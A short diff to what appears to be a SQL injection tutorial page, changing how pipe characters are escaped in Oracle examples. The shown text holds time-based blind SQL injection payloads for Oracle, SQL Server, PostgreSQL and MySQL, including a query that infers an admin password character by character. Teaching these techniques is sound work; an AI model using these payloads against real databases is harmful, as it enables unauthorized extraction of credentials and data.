@@ -442,7 +442,7 @@ These are some examples on how you would abuse this condition to retrieve data:
 
 | Database type | Query |
 | --- | --- |
-| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a' \|\| dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a' &verbar;&verbar; dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
 | Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
 | PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
 | MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |
@@ -452,7 +452,7 @@ These are some examples on how you would abuse this condition to retrieve data:
 <template v-slot:oracle>
 
 ```sql
-SELECT CASE WHEN ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) THEN 'a' \|\| dbms_pipe.receive_message(('a'), {{ delay 10 }}) ELSE NULL END FROM dual
+SELECT CASE WHEN ({{ evaluated-condition Username = 'admin' AND SUBSTRING(Password, 1, 1) > 'm' }}) THEN 'a' &verbar;&verbar; dbms_pipe.receive_message(('a'), {{ delay 10 }}) ELSE NULL END FROM dual
 ```
 
 </template>
